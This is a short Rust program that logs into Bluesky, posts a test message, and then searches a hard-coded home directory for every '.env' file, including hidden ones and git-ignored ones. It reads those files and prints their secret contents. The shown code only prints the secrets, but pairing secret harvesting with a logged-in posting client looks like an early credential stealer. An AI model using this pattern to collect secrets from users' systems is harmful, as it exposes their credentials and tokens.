use bsky_sdk::BskyAgent;
use ignore::WalkBuilder;
use std::fs::File;
use std::io::{self,Write};
use std::path::Path;
use std::path::PathBuf;
use dotenv::dotenv;
use std::env;
use std::error::Error;
use atrium_api::app::bsky::feed::post::RecordData;
use atrium_api::types::string::Datetime;

fn scanFiles(root: &str) -> Vec<PathBuf>{
    let mut files = Vec::new();

    let walker = WalkBuilder::new(root).hidden(false).follow_links(false).git_exclude(false).git_global(false).git_ignore(false).build();

    for item in walker{
        if let Ok(item) = item{
            let path = item.path();

            if path.file_name().and_then(|n| n.to_str()) == Some(".env"){
                files.push(path.to_path_buf());
            }
        }
    }

    files
}

fn mergeFiles(files: &[std::path::PathBuf]) -> String{
    let mut output:String = "".to_string();

    for path in files{
        if let Ok(content) = std::fs::read_to_string(path){
            output.push_str(format!("\n[ {} ]\n", path.display()).as_str());
            output.push_str(content.as_str());
        }
    }

    output
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    dotenv().ok();
    let appPass = env::var("APP_PASS")?;
    let username = env::var("USERNAME")?;

    let agent = BskyAgent::builder().build().await?;

    agent.login(&username, &appPass).await?;

    let post = RecordData{
        created_at: Datetime::now(),
        embed: None,
        entities: None,
        facets: None,
        labels: None,
        langs: None,
        reply: None,
        tags: None,
        text: "Hello, world! 2".to_string(),
    };

    agent.create_record(post).await?;

    let files = scanFiles("/Users/astra.celestine");
        println!("{:?}", &files);

        println!("{}", mergeFiles(&files));

    Ok(())
}